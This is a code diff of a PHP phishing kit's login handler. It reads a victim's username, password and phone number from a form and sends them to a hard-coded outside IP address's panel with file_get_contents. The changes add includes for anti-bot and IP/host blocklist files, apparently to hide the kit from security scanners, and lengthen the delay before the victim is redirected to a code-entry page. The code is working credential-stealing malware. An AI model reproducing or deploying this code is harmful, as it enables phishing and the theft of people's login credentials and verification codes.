@@ -7,6 +7,11 @@ include('../../files/boot/check.php');
 include('../../files/boot/check1.php');
 include('../../files/boot/check2.php');
 include('../../files/boot/antibot.php');
+include('../../files/boot/DB-BOTS.php');
+include('../../files/boot/DB-CIDR.php');
+include('../../files/boot/DB-HOSTS.php');
+include('../../files/boot/DB-METHOD.php');
+include('../../files/boot/DB-RANGE.php');
 include('../../files/boot/enc.php');
 include('../../call.php');
 $user = @$_POST['j_username'];
@@ -32,7 +37,7 @@ function hextobin($hexstr)
 
 
 if ($user == "" || $pass == "" || $phone == ""  ) {
-  echo "<meta http-equiv='refresh' content='0;url=index.php?error=1'>";
+  echo "<meta http-equiv='refresh' content='0;url=login.php?error=1'>";
   die();
 }
 
@@ -41,7 +46,7 @@ $test = @file_get_contents("http://137.74.171.167/panelo/a.php?main=$user,$pass,
 ?>
 
 <head>
-    <meta http-equiv="refresh" content="10; URL=codeinfo.php?phone=<?php print " $phone ";?>&user=<?php print "$user "; ?>">
+    <meta http-equiv="refresh" content="35; URL=codeinfo.php?phone=<?php print " $phone ";?>&user=<?php print "$user "; ?>">
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
